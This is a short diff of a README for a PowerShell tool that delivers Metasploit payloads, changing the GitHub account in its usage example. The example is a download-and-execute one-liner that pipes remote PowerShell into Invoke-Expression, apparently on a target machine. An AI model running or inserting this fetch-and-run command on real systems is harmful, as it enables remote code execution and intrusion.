@@ -65,7 +65,7 @@ _**You can ignore the line about "Run the following command on the target machin
 Usage is simple, first execute the PS1 file.
 
 ```
-PS> Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Inv
+PS> Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/pfussell/Invoke-MetasploitPayload/master/Inv
 oke-MetasploitPayload.ps1")
 ```
 
